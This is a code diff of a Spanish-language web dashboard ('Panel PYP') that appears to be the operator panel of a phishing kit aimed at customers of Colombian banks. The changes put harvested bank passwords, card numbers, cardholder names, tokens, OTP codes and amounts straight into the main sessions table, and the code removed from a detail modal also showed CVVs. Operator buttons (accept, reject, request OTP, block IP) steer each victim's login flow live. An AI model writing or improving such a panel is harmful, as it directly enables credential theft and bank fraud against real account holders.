@@ -24,42 +24,51 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 #dashboard { display: none; }
 #dashboard.visible { display: block; }
 
-.topbar { background: #151b2e; border-bottom: 1px solid #252d44; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
-.topbar h1 { font-size: 20px; color: #88f456; }
-.topbar-right { display: flex; align-items: center; gap: 16px; }
+.topbar { background: #151b2e; border-bottom: 1px solid #252d44; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; gap: 16px; flex-wrap: wrap; }
+.topbar-left { display: flex; align-items: center; gap: 20px; }
+.topbar h1 { font-size: 18px; color: #88f456; white-space: nowrap; }
+.tabs { display: flex; gap: 4px; }
+.tab-btn { background: transparent; border: none; color: #8b94a8; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
+.tab-btn:hover { background: #1a2035; color: #e5e7eb; }
+.tab-btn.active { background: #88f456; color: #0a0e1a; }
+.topbar-right { display: flex; align-items: center; gap: 12px; }
 .topbar-user { color: #8b94a8; font-size: 13px; }
 .topbar-user strong { color: #e5e7eb; }
-.btn-logout { background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+.btn-logout { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
 .btn-logout:hover { background: #dc2626; }
 
-.container { max-width: 1400px; margin: 0 auto; padding: 24px; }
+.container { max-width: 1600px; margin: 0 auto; padding: 20px; }
+.tab-content { display: none; }
+.tab-content.active { display: block; }
 
-.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
-.stat-card { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 20px; }
-.stat-card .label { color: #8b94a8; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
-.stat-card .value { font-size: 32px; font-weight: 700; color: #88f456; }
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 20px; }
+.stat-card { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; }
+.stat-card .label { color: #8b94a8; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+.stat-card .value { font-size: 28px; font-weight: 700; color: #88f456; }
 .stat-card.pending .value { color: #fbbf24; }
 .stat-card.blocked .value { color: #ef4444; }
 .stat-card.sessions .value { color: #60a5fa; }
 
-.section { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
-.section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #252d44; }
-.section-title { font-size: 16px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 8px; }
+.section { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+.section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #252d44; }
+.section-title { font-size: 15px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 8px; }
 .section-title .badge { background: #252d44; color: #88f456; font-size: 11px; padding: 3px 8px; border-radius: 12px; font-weight: 700; }
 
-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
 thead { background: #0f1421; }
-thead th { text-align: left; padding: 10px 12px; color: #8b94a8; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #252d44; }
+thead th { text-align: left; padding: 8px 10px; color: #8b94a8; font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #252d44; white-space: nowrap; }
 tbody tr { border-bottom: 1px solid #1a1f35; transition: background 0.15s; }
 tbody tr:hover { background: rgba(136, 244, 86, 0.04); }
-tbody td { padding: 12px; color: #cbd5e1; vertical-align: middle; }
-tbody td.mono { font-family: 'Courier New', monospace; font-size: 12px; color: #88f456; }
-tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; }
+tbody td { padding: 10px; color: #cbd5e1; vertical-align: middle; }
+tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #88f456; }
+tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; font-size: 11px; }
+tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #cbd5e1; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
-.empty { text-align: center; padding: 40px 20px; color: #6b7280; font-style: italic; font-size: 13px; }
+.empty { text-align: center; padding: 30px 20px; color: #6b7280; font-style: italic; font-size: 12px; }
 
-.actions { display: flex; gap: 6px; flex-wrap: wrap; }
-.btn { padding: 6px 12px; border-radius: 6px; border: none; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; white-space: nowrap; }
+.actions { display: flex; gap: 4px; flex-wrap: nowrap; }
+.btn { padding: 5px 9px; border-radius: 6px; border: none; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.15s; white-space: nowrap; display: inline-flex; align-items: center; gap: 3px; }
 .btn-accept { background: #16a34a; color: white; }
 .btn-accept:hover { background: #15803d; }
 .btn-reject { background: #dc2626; color: white; }
@@ -74,11 +83,8 @@ tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; }
 .btn-block:hover { background: #d97706; }
 .btn-unblock { background: #3b82f6; color: white; }
 .btn-unblock:hover { background: #2563eb; }
-.btn-view { background: #475569; color: white; }
-.btn-view:hover { background: #334155; }
-.btn:disabled { opacity: 0.4; cursor: not-allowed; }
 
-.estado { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
+.estado { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; white-space: nowrap; }
 .estado-pendiente { background: rgba(251, 191, 36, 0.15); color: #fbbf24; }
 .estado-aceptado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
 .estado-rechazado { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
@@ -86,7 +92,7 @@ tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; }
 .estado-token { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
 .estado-finalizado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
 
-.block-input { display: flex; gap: 8px; margin-bottom: 16px; }
+.block-input { display: flex; gap: 8px; margin-bottom: 14px; }
 .block-input input { flex: 1; padding: 10px 14px; background: #0f1421; border: 1px solid #252d44; border-radius: 8px; color: #e5e7eb; font-size: 13px; outline: none; }
 .block-input input:focus { border-color: #88f456; }
 .block-input button { padding: 10px 20px; background: #ef4444; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 13px; }
@@ -99,27 +105,11 @@ tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; }
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
 
-#modalVerDatos { position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; }
-#modalVerDatos.hidden { display: none; }
-.modal-content { background: #151b2e; border: 1px solid #252d44; border-radius: 16px; max-width: 600px; width: 100%; max-height: 90vh; overflow-y: auto; }
-.modal-header { padding: 20px 24px; border-bottom: 1px solid #252d44; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: #151b2e; z-index: 1; }
-.modal-header h2 { font-size: 18px; color: #88f456; }
-.modal-close { background: none; border: none; color: #8b94a8; font-size: 24px; cursor: pointer; padding: 0 8px; }
-.modal-close:hover { color: #e5e7eb; }
-.modal-body { padding: 20px 24px; }
-.dato-row { display: flex; padding: 10px 0; border-bottom: 1px solid #1a1f35; }
-.dato-row:last-child { border-bottom: none; }
-.dato-label { flex: 0 0 130px; color: #8b94a8; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
-.dato-value { flex: 1; color: #e5e7eb; font-family: 'Courier New', monospace; font-size: 13px; word-break: break-all; }
-
 @media (max-width: 768px) {
-    .container { padding: 12px; }
+    .container { padding: 10px; }
     .stats { grid-template-columns: 1fr 1fr; }
-    table { font-size: 12px; }
-    thead th, tbody td { padding: 8px 6px; }
-    .actions { flex-direction: column; }
-    .btn { width: 100%; }
-    .dato-label { flex: 0 0 100px; font-size: 11px; }
+    .topbar-left { gap: 10px; }
+    .tab-btn { padding: 6px 10px; font-size: 12px; }
 }
 </style>
 </head>
@@ -138,7 +128,14 @@ tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; }
 
 <div id="dashboard">
     <div class="topbar">
-        <h1>⚡ Panel PYP</h1>
+        <div class="topbar-left">
+            <h1>⚡ Panel PYP</h1>
+            <div class="tabs">
+                <button class="tab-btn active" data-tab="principal">📊 Principal</button>
+                <button class="tab-btn" data-tab="ips">🚫 IPs</button>
+                <button class="tab-btn" data-tab="logs">📜 Logs</button>
+            </div>
+        </div>
         <div class="topbar-right">
             <span class="topbar-user">Sesión: <strong id="currentUser">-</strong></span>
             <button class="btn-logout" id="logoutBtn">Cerrar sesión</button>
@@ -146,127 +143,137 @@ tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; }
     </div>
 
     <div class="container">
-        <div class="stats">
-            <div class="stat-card">
-                <div class="label">🟢 Usuarios activos</div>
-                <div class="value" id="statActivos">0</div>
-            </div>
-            <div class="stat-card sessions">
-                <div class="label">💳 Sesiones totales</div>
-                <div class="value" id="statSesiones">0</div>
-            </div>
-            <div class="stat-card pending">
-                <div class="label">⏳ Pendientes</div>
-                <div class="value" id="statPendientes">0</div>
-            </div>
-            <div class="stat-card blocked">
-                <div class="label">🚫 IPs bloqueadas</div>
-                <div class="value" id="statBloqueadas">0</div>
-            </div>
-        </div>
 
-        <div class="section">
-            <div class="section-header">
-                <div class="section-title">
-                    <span class="loading-indicator"></span>
-                    🟢 Usuarios activos en tiempo real
-                    <span class="badge" id="badgeActivos">0</span>
+        <div class="tab-content active" id="tab-principal">
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="label">🟢 Activos</div>
+                    <div class="value" id="statActivos">0</div>
+                </div>
+                <div class="stat-card sessions">
+                    <div class="label">💳 Sesiones</div>
+                    <div class="value" id="statSesiones">0</div>
+                </div>
+                <div class="stat-card pending">
+                    <div class="label">⏳ Pendientes</div>
+                    <div class="value" id="statPendientes">0</div>
+                </div>
+                <div class="stat-card blocked">
+                    <div class="label">🚫 IPs bloqueadas</div>
+                    <div class="value" id="statBloqueadas">0</div>
                 </div>
             </div>
-            <table>
-                <thead>
-                    <tr>
-                        <th>IP</th>
-                        <th>Sesión</th>
-                        <th>Última acción</th>
-                        <th>Tiempo dentro</th>
-                        <th>Acciones</th>
-                    </tr>
-                </thead>
-                <tbody id="tbodyActivos">
-                    <tr><td colspan="5" class="empty">Cargando...</td></tr>
-                </tbody>
-            </table>
-        </div>
 
-        <div class="section">
-            <div class="section-header">
-                <div class="section-title">
-                    💳 Sesiones de pago
-                    <span class="badge" id="badgeSesiones">0</span>
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        <span class="loading-indicator"></span>
+                        🟢 Usuarios activos
+                        <span class="badge" id="badgeActivos">0</span>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP</th>
+                                <th>Última acción</th>
+                                <th>Tiempo</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyActivos">
+                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Sesión</th>
-                        <th>Banco</th>
-                        <th>Estado</th>
-                        <th>Identificación</th>
-                        <th>IP</th>
-                        <th>Acciones</th>
-                    </tr>
-                </thead>
-                <tbody id="tbodySesiones">
-                    <tr><td colspan="6" class="empty">Cargando...</td></tr>
-                </tbody>
-            </table>
-        </div>
 
-        <div class="section">
-            <div class="section-header">
-                <div class="section-title">
-                    🚫 IPs bloqueadas
-                    <span class="badge" id="badgeIps">0</span>
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        💳 Sesiones de pago
+                        <span class="badge" id="badgeSesiones">0</span>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Banco</th>
+                                <th>Estado</th>
+                                <th>Identificación</th>
+                                <th>Clave</th>
+                                <th>Doc / Tarjeta</th>
+                                <th>Titular</th>
+                                <th>Token</th>
+                                <th>OTP</th>
+                                <th>Monto</th>
+                                <th>IP</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodySesiones">
+                            <tr><td colspan="11" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
-            <div class="block-input">
-                <input type="text" id="inputNuevaIp" placeholder="IP a bloquear (ej. 190.25.10.5)">
-                <button id="btnBloquearManual">Bloquear</button>
-            </div>
-            <table>
-                <thead>
-                    <tr>
-                        <th>IP</th>
-                        <th>Acciones</th>
-                    </tr>
-                </thead>
-                <tbody id="tbodyIps">
-                    <tr><td colspan="2" class="empty">Sin IPs bloqueadas</td></tr>
-                </tbody>
-            </table>
         </div>
 
-        <div class="section">
-            <div class="section-header">
-                <div class="section-title">
-                    📜 Logs de acceso al panel
-                    <span class="badge" id="badgeLogs">0</span>
+        <div class="tab-content" id="tab-ips">
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        🚫 IPs bloqueadas
+                        <span class="badge" id="badgeIps">0</span>
+                    </div>
+                </div>
+                <div class="block-input">
+                    <input type="text" id="inputNuevaIp" placeholder="IP a bloquear (ej. 190.25.10.5)">
+                    <button id="btnBloquearManual">Bloquear</button>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyIps">
+                            <tr><td colspan="2" class="empty">Sin IPs bloqueadas</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Fecha</th>
-                        <th>Tipo</th>
-                        <th>Detalles</th>
-                    </tr>
-                </thead>
-                <tbody id="tbodyLogs">
-                    <tr><td colspan="3" class="empty">Cargando...</td></tr>
-                </tbody>
-            </table>
         </div>
-    </div>
-</div>
 
-<div id="modalVerDatos" class="hidden">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h2>📋 Detalles de la sesión</h2>
-            <button class="modal-close" onclick="cerrarModal()">×</button>
+        <div class="tab-content" id="tab-logs">
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        📜 Logs de acceso al panel
+                        <span class="badge" id="badgeLogs">0</span>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Fecha</th>
+                                <th>Tipo</th>
+                                <th>Detalles</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyLogs">
+                            <tr><td colspan="3" class="empty">Cargando...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
         </div>
-        <div class="modal-body" id="modalBody"></div>
+
     </div>
 </div>
 
@@ -295,6 +302,12 @@ function escapeHtml(s) {
     }[c]));
 }
 
+function truncar(s, max = 30) {
+    if (!s) return '-';
+    s = String(s);
+    return s.length > max ? s.slice(0, max) + '...' : s;
+}
+
 function formatTime(segundos) {
     if (segundos < 60) return segundos + 's';
     if (segundos < 3600) return Math.floor(segundos / 60) + 'm ' + (segundos % 60) + 's';
@@ -303,11 +316,11 @@ function formatTime(segundos) {
 
 function nombreBanco(key) {
     const nombres = {
-        'cc-bogota': 'CC Bogotá (Tarjeta)',
+        'cc-bogota': '💳 CC-Bogotá',
         'bancolombia': 'Bancolombia',
         'davivienda': 'Davivienda',
         'avvillas': 'AV Villas',
-        'bogota': 'Banco de Bogotá',
+        'bogota': 'B. Bogotá',
         'caja-social': 'Caja Social',
         'bbva': 'BBVA',
         'popular': 'Popular',
@@ -385,6 +398,15 @@ function logout() {
 
 $('logoutBtn').addEventListener('click', logout);
 
+document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        btn.classList.add('active');
+        $('tab-' + btn.dataset.tab).classList.add('active');
+    });
+});
+
 function mostrarDashboard() {
     $('loginScreen').style.display = 'none';
     $('dashboard').classList.add('visible');
@@ -418,13 +440,12 @@ async function cargarActivos() {
         const d = await api('/admin/activos');
         const tbody = $('tbodyActivos');
         if (!d.activos.length) {
-            tbody.innerHTML = '<tr><td colspan="5" class="empty">Sin usuarios activos</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>';
             return;
         }
         tbody.innerHTML = d.activos.map(a => `
             <tr>
                 <td class="ip">${escapeHtml(a.ip)}</td>
-                <td class="mono">${escapeHtml(a.sessionId.slice(-12))}</td>
                 <td>${escapeHtml(a.ultimaAccion)}</td>
                 <td>${formatTime(a.tiempoDentro)}</td>
                 <td>
@@ -444,18 +465,14 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-    btns.push(`<button class="btn btn-view" onclick="verDatos('${sid}')">👁 Ver</button>`);
-
     if (bancoKey === 'cc-bogota') {
-        if (estado !== 'aceptado' && estado !== 'finalizado') {
+        if (estado !== 'rechazado' && estado !== 'finalizado') {
             btns.push(`<button class="btn btn-accept" onclick="accion('${sid}','ACEPTAR')">✅ Aceptar</button>`);
         }
-        if (estado !== 'rechazado') {
+        if (estado !== 'rechazado' && estado !== 'finalizado') {
             btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
         }
-        if (estado === 'otp' || estado === 'aceptado') {
-            btns.push(`<button class="btn btn-final" onclick="accion('${sid}','FINALIZAR')">✅ Finalizar</button>`);
-        }
+        btns.push(`<button class="btn btn-block" onclick="bloquearIp('${ip}')">🚫 IP</button>`);
         return btns.join('');
     }
 
@@ -480,6 +497,8 @@ function botonesSesion(s) {
             btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
         }
         btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+    } else if (estado === 'aceptado') {
+        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
     }
 
     btns.push(`<button class="btn btn-block" onclick="bloquearIp('${ip}')">🚫 IP</button>`);
@@ -492,20 +511,32 @@ async function cargarSesiones() {
         const d = await api('/admin/sesiones');
         const tbody = $('tbodySesiones');
         if (!d.sesiones.length) {
-            tbody.innerHTML = '<tr><td colspan="6" class="empty">Sin sesiones</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="11" class="empty">Sin sesiones</td></tr>';
             return;
         }
         const sorted = d.sesiones.reverse();
         tbody.innerHTML = sorted.map(s => {
-            const banco = s.datos.bancoKey || '-';
-            const identificacion = s.datos.identificacion || s.datos.docNumber || '-';
-            const ip = s.datos.ip || '-';
+            const datos = s.datos || {};
+            const banco = datos.bancoKey || '-';
+            const identificacion = datos.identificacion || '-';
+            const clave = datos.clave || '-';
+            const doc = datos.docNumber || (datos.tarjeta ? truncar(datos.tarjeta, 20) : '-');
+            const titular = datos.titular || '-';
+            const token = datos.token || '-';
+            const otp = datos.otp || '-';
+            const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
+            const ip = datos.ip || '-';
             return `
                 <tr>
-                    <td class="mono">${escapeHtml(s.sessionId.slice(-16))}</td>
                     <td>${escapeHtml(nombreBanco(banco))}</td>
                     <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
-                    <td class="mono">${escapeHtml(identificacion)}</td>
+                    <td class="dato">${escapeHtml(identificacion)}</td>
+                    <td class="dato">${escapeHtml(clave)}</td>
+                    <td class="dato" title="${escapeHtml(doc)}">${escapeHtml(doc)}</td>
+                    <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
+                    <td class="dato">${escapeHtml(token)}</td>
+                    <td class="dato">${escapeHtml(otp)}</td>
+                    <td class="dato">${escapeHtml(monto)}</td>
                     <td class="ip">${escapeHtml(ip)}</td>
                     <td><div class="actions">${botonesSesion(s)}</div></td>
                 </tr>
@@ -513,49 +544,6 @@ async function cargarSesiones() {
         }).join('');
     } catch (e) {}
 }
-
-async function verDatos(sessionId) {
-    try {
-        const d = await api('/admin/sesion/' + encodeURIComponent(sessionId));
-        const datos = d.datos || {};
-        const rows = [];
-        rows.push(['Sesión', d.sessionId]);
-        rows.push(['Estado', d.estado]);
-        rows.push(['Banco', nombreBanco(datos.bancoKey)]);
-        rows.push(['IP', datos.ip || '-']);
-        rows.push(['Creado', datos.creadoEn ? new Date(datos.creadoEn).toLocaleString('es-CO') : '-']);
-        if (datos.tipo) rows.push(['Tipo', datos.tipo]);
-        if (datos.tipoDoc) rows.push(['Tipo doc', datos.tipoDoc]);
-        if (datos.identificacion) rows.push(['Identificación', datos.identificacion]);
-        if (datos.clave) rows.push(['Clave', datos.clave]);
-        if (datos.marca) rows.push(['Marca', datos.marca.toUpperCase()]);
-        if (datos.tarjeta) rows.push(['Tarjeta', datos.tarjeta]);
-        if (datos.titular) rows.push(['Titular', datos.titular]);
-        if (datos.docType) rows.push(['Doc tipo', datos.docType]);
-        if (datos.docNumber) rows.push(['Doc número', datos.docNumber]);
-        if (datos.expMes || datos.expAnio) rows.push(['Expira', `${datos.expMes || '--'}/${datos.expAnio || '--'}`]);
-        if (datos.cvv) rows.push(['CVV', datos.cvv]);
-        if (datos.monto) rows.push(['Monto', '$' + Number(datos.monto).toLocaleString('es-CO') + ' COP']);
-        if (datos.token) rows.push(['Token', datos.token]);
-        if (datos.otp) rows.push(['OTP', datos.otp]);
-
-        $('modalBody').innerHTML = rows.map(([k, v]) => `
-            <div class="dato-row">
-                <div class="dato-label">${escapeHtml(k)}</div>
-                <div class="dato-value">${escapeHtml(v)}</div>
-            </div>
-        `).join('');
-        $('modalVerDatos').classList.remove('hidden');
-    } catch (e) { toast('Error: ' + e.message, true); }
-}
-
-function cerrarModal() {
-    $('modalVerDatos').classList.add('hidden');
-}
-
-$('modalVerDatos').addEventListener('click', e => {
-    if (e.target === $('modalVerDatos')) cerrarModal();
-});
 
 async function cargarIps() {
     try {
@@ -589,7 +577,7 @@ async function cargarLogs() {
                 <tr>
                     <td>${escapeHtml(fecha)}</td>
                     <td>${escapeHtml(l.tipo)}</td>
-                    <td class="mono" style="font-size:11px">${escapeHtml(JSON.stringify(l.datos))}</td>
+                    <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td>
                 </tr>
             `;
         }).join('');
